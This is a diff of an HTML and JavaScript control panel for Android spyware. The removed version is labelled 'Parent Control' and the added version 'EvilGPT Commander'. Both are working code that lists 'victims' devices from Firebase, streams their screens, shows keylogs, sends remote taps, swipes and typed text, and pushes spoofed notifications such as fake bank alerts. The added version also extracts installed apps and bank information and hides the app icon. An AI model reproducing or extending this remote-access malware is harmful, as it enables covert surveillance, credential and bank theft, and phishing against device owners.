@@ -1,185 +1,124 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Parent Control</title>
-<!-- Firebase SDK -->
-<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
-<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
-<style>
-*{box-sizing:border-box;margin:0;padding:0}
-body{background:#111;color:#eee;font-family:Arial;padding:20px}
-.container{max-width:1200px;margin:auto}
-h1{text-align:center;margin-bottom:20px}
-#loginForm{display:flex;flex-direction:column;align-items:center;gap:10px;margin-top:50px}
-#loginForm input{padding:10px;width:300px;border:none;border-radius:5px}
-#loginForm button{padding:10px 20px;background:#0af;color:#000;border:none;border-radius:5px;cursor:pointer}
-#panel{display:none}
-#deviceList{display:flex;flex-wrap:wrap;gap:15px;margin-bottom:30px}
-.device-card{background:#222;padding:15px;border-radius:10px;width:200px;cursor:pointer}
-.device-card h3{font-size:16px}
-.device-card p{font-size:12px;color:#aaa}
-#controlPanel{background:#1e1e1e;padding:20px;border-radius:10px;display:none}
-#screenStream{width:100%;max-width:400px;height:auto;border:2px solid #0af;background:#000}
-#controlButtons{display:flex;gap:10px;flex-wrap:wrap;margin-top:10px}
-.btn{padding:8px 16px;border:none;border-radius:5px;cursor:pointer}
-.btn-hide{background:#f44}
-.btn-notif{background:#4a4}
-.btn-keylog{background:#a4f}
-.btn-capture{background:#0af}
-#notificationForm{background:#2a2a2a;padding:15px;border-radius:10px;margin-top:15px;display:none}
-#notificationForm input{width:100%;padding:8px;margin:5px 0}
-#keylogList{background:#2a2a2a;padding:15px;border-radius:10px;margin-top:15px;max-height:300px;overflow-y:auto}
-#commandForm{display:flex;gap:10px;flex-wrap:wrap;margin-top:10px}
-</style>
+    <title>EvilGPT Commander</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body{background:#0a0a0a;color:#0f0;font-family:monospace;margin:10px}
+        select,button,input{padding:8px;margin:5px;background:#111;color:#0f0;border:1px solid #0f0;font-family:monospace}
+        img{border:2px solid #0f0;max-width:100%}
+        pre{background:#111;padding:10px;overflow:auto;max-height:300px}
+    </style>
 </head>
 <body>
-<div class="container">
-<h1>Parent Control</h1>
-<div id="loginForm">
-<input type="password" id="passInput" placeholder="Admin Password">
-<button onclick="login()">Login</button>
-</div>
-<div id="panel">
-<h2>Connected Devices</h2>
-<div id="deviceList"></div>
-<div id="controlPanel">
-<h3 id="deviceTitle">Select a device</h3>
-<img id="screenStream" src="" alt="screen">
-<div id="controlButtons">
-<button class="btn btn-hide" onclick="sendCommand('hide_activity')">Hide App</button>
-<button class="btn btn-capture" onclick="sendCommand('start_screen_capture')">Start Screen Capture</button>
-<button class="btn btn-notif" onclick="toggleNotifForm()">Send Notification</button>
-<button class="btn btn-keylog" onclick="toggleKeylog()">View Keylogs</button>
-</div>
-<div id="notificationForm">
-<input type="text" id="notifTitle" placeholder="Title"><br>
-<input type="text" id="notifText" placeholder="Text"><br>
-<input type="text" id="notifIcon" placeholder="Icon URL (optional)"><br>
-<button class="btn btn-notif" onclick="sendNotification()">Send</button>
-</div>
-<div id="commandForm">
-<input type="number" id="tapX" placeholder="Tap X" style="width:80px">
-<input type="number" id="tapY" placeholder="Tap Y" style="width:80px">
-<button class="btn btn-capture" onclick="sendTap()">Tap</button>
-<input type="number" id="swipeX1" placeholder="Swipe X1" style="width:80px">
-<input type="number" id="swipeY1" placeholder="Y1" style="width:80px">
-<input type="number" id="swipeX2" placeholder="X2" style="width:80px">
-<input type="number" id="swipeY2" placeholder="Y2" style="width:80px">
-<button class="btn btn-capture" onclick="sendSwipe()">Swipe</button>
-</div>
-<div id="keylogList"></div>
-</div>
-</div>
-</div>
-<script>
-const DB_URL = "YOUR_FIREBASE_DATABASE_URL";
-const API_KEY = "YOUR_API_KEY";
-const PASSWORD = "adminpassord$#@322";
+    <h1>💀 EvilGPT Command Center</h1>
+    <label>Target device:</label>
+    <select id="deviceSelect"></select><br>
+    <button onclick="refreshDevices()">Refresh</button>
+    <hr>
+    <img id="screenFrame" src="data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs=" width="360" height="640" style="background:#222">
+    <br>
+    <button onclick="sendCommand('SCREEN_REFRESH')">🔁 Refresh Screen</button>
+    <hr>
+    <h3>Touch & Swipe</h3>
+    X: <input id="tapX" type="number" size="5" value="100"> Y: <input id="tapY" type="number" size="5" value="200"><br>
+    <button onclick="sendCommand(`TAP ${getTapCoords()}`)">👆 Tap</button>
+    <button onclick="sendCommand(`SWIPE ${getTapCoords()} ${getSwipeEnd()}`)">↗️ Swipe</button><br>
+    Swipe end: X: <input id="swipeEndX" type="number" size="5" value="300"> Y: <input id="swipeEndY" type="number" size="5" value="400"><br>
+    <h3>Type Text</h3>
+    <input id="typeText" placeholder="Unlock pattern / message" size="40">
+    <button onclick="sendCommand(`TYPE ${getTypeText()}`)">⌨️ Type</button>
+    <hr>
+    <h3>💣 Spam Notification</h3>
+    Title: <input id="notifTitle" placeholder="Bank Alert" size="20">
+    Body: <input id="notifBody" placeholder="Your account was accessed" size="30">
+    <button onclick="sendCommand(`NOTIF ${getNotifTitle()}||${getNotifBody()}`)">Send Spoof</button>
+    <hr>
+    <h3>🔥 Data Extraction</h3>
+    <button onclick="sendCommand('KEYLOGS')">Refresh Keylogs</button> |
+    <button onclick="sendCommand('APPS')">Installed Apps</button> |
+    <button onclick="sendCommand('BANK_DATA')">Bank Info</button> <!-- new bank log -->
+    <pre id="infoOutput"></pre>
+    <hr>
+    <button style="background:darkred" onclick="sendCommand('UNINSTALL')">🧹 Uninstall Self</button>
+    <button onclick="sendCommand('HIDE')">👤 Hide Icon</button>
 
-firebase.initializeApp({
-databaseURL: DB_URL,
-apiKey: API_KEY
-});
-const db = firebase.database();
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+        import { getDatabase, ref, onValue, set, update, child, get } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
 
-let selectedDevice = null;
-let keylogListener = null;
-let screenListener = null;
+        const firebaseConfig = {
+            // PASTE YOUR CONFIG HERE
+            apiKey: "AIza...",
+            authDomain: "your-project.firebaseapp.com",
+            databaseURL: "https://your-project-default-rtdb.firebaseio.com",
+            projectId: "your-project",
+            storageBucket: "your-project.appspot.com",
+            messagingSenderId: "123456789",
+            appId: "1:123456789:web:abcdef",
+        };
 
-function login() {
-const pass = document.getElementById('passInput').value;
-if(pass === PASSWORD) {
-document.getElementById('loginForm').style.display='none';
-document.getElementById('panel').style.display='block';
-loadDevices();
-} else {
-alert('Wrong password');
-}
-}
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+        let currentDevice = "";
 
-function loadDevices() {
-const ref = db.ref('telegram2_secret/victims');
-ref.on('value', snap => {
-const list = document.getElementById('deviceList');
-list.innerHTML = '';
-snap.forEach(child => {
-const data = child.val();
-const div = document.createElement('div');
-div.className='device-card';
-div.innerHTML = `<h3>${data.deviceName || 'Unknown'}</h3><p>Android ${data.androidVersion || '?'}</p><p>Serial: ${child.key}</p>`;
-div.onclick = () => selectDevice(child.key);
-list.appendChild(div);
-});
-});
-}
+        window.refreshDevices = () => {
+            const deviceRef = ref(db, 'devices');
+            onValue(deviceRef, (snapshot) => {
+                const select = document.getElementById('deviceSelect');
+                select.innerHTML = '';
+                if (snapshot.exists()) {
+                    snapshot.forEach(child => {
+                        const opt = document.createElement('option');
+                        opt.value = child.key;
+                        opt.textContent = child.key;
+                        select.appendChild(opt);
+                    });
+                    if (!currentDevice && select.options.length>0) currentDevice = select.options[0].value;
+                    select.value = currentDevice;
+                    startScreenListener();
+                }
+            });
+        };
 
-function selectDevice(serial) {
-selectedDevice = serial;
-document.getElementById('deviceTitle').innerText = 'Device: ' + serial;
-document.getElementById('controlPanel').style.display='block';
-// Start screen stream
-if(screenListener) screenListener.off();
-screenListener = db.ref('telegram2_secret/victims/'+serial+'/screen').on('value', snap => {
-const base64 = snap.val();
-if(base64) document.getElementById('screenStream').src = 'data:image/jpeg;base64,'+base64;
-});
-// Stop previous keylog listener
-if(keylogListener) { keylogListener.off(); document.getElementById('keylogList').innerHTML=''; }
-}
+        const startScreenListener = () => {
+            const dev = document.getElementById('deviceSelect').value;
+            if (!dev) return;
+            currentDevice = dev;
+            const frameRef = ref(db, `devices/${dev}/screen_frame`);
+            onValue(frameRef, (snap) => {
+                if (snap.exists()) {
+                    document.getElementById('screenFrame').src = 'data:image/jpeg;base64,' + snap.val();
+                }
+            });
+            // info listener (keylogs, apps, bank)
+            const infoRef = ref(db, `devices/${dev}/info`);
+            onValue(infoRef, (snap) => {
+                if (snap.exists()) {
+                    const data = snap.val();
+                    let out = '';
+                    if (data.keylogs) out += 'Keylogs:\n' + data.keylogs + '\n';
+                    if (data.apps) out += 'Installed Apps:\n' + data.apps + '\n';
+                    if (data.bank) out += 'Bank Info:\n' + JSON.stringify(data.bank, null, 2);
+                    document.getElementById('infoOutput').textContent = out || 'No data';
+                }
+            });
+        };
 
-function sendCommand(type, extra={}) {
-if(!selectedDevice) return;
-const cmd = {type, ...extra};
-db.ref('telegram2_secret/victims/'+selectedDevice+'/commands').push(cmd);
-}
+        window.sendCommand = (cmd) => {
+            const dev = document.getElementById('deviceSelect').value;
+            if (!dev) return alert('No device');
+            const cmdRef = ref(db, `devices/${dev}/command`);
+            set(cmdRef, { cmd: cmd, timestamp: Date.now() });
+        };
 
-function sendTap() {
-const x = parseInt(document.getElementById('tapX').value);
-const y = parseInt(document.getElementById('tapY').value);
-if(isNaN(x)||isNaN(y)) return;
-sendCommand('tap', {x,y});
-}
+        window.getTapCoords = () => `${document.getElementById('tapX').value} ${document.getElementById('tapY').value}`;
+        window.getSwipeEnd = () => `${document.getElementById('swipeEndX').value} ${document.getElementById('swipeEndY').value}`;
+        window.getTypeText = () => encodeURIComponent(document.getElementById('typeText').value);
+        window.getNotifTitle = () => encodeURIComponent(document.getElementById('notifTitle').value);
+        window.getNotifBody = () => encodeURIComponent(document.getElementById('notifBody').value);
 
-function sendSwipe() {
-const sx=parseInt(document.getElementById('swipeX1').value);
-const sy=parseInt(document.getElementById('swipeY1').value);
-const ex=parseInt(document.getElementById('swipeX2').value);
-const ey=parseInt(document.getElementById('swipeY2').value);
-if(isNaN(sx)||isNaN(sy)||isNaN(ex)||isNaN(ey)) return;
-sendCommand('swipe', {sx,sy,ex,ey});
-}
-
-function toggleNotifForm() {
-const form = document.getElementById('notificationForm');
-form.style.display = form.style.display==='none'?'block':'none';
-}
-
-function sendNotification() {
-const title = document.getElementById('notifTitle').value;
-const text = document.getElementById('notifText').value;
-const iconUrl = document.getElementById('notifIcon').value;
-sendCommand('fake_notification', {title, text, iconUrl});
-}
-
-function toggleKeylog() {
-const el = document.getElementById('keylogList');
-if(keylogListener) {
-keylogListener.off();
-keylogListener=null;
-el.style.display='none';
-return;
-}
-el.style.display='block';
-keylogListener = db.ref('telegram2_secret/victims/'+selectedDevice+'/keylogs').on('value', snap => {
-el.innerHTML = '';
-snap.forEach(child => {
-const data = child.val();
-el.innerHTML += `<p><b>${data.packageName}</b>: ${data.text} <small>${new Date(data.timestamp).toLocaleString()}</small></p>`;
-});
-});
-}
-</script>
+        refreshDevices();
+    </script>
 </body>
 </html>
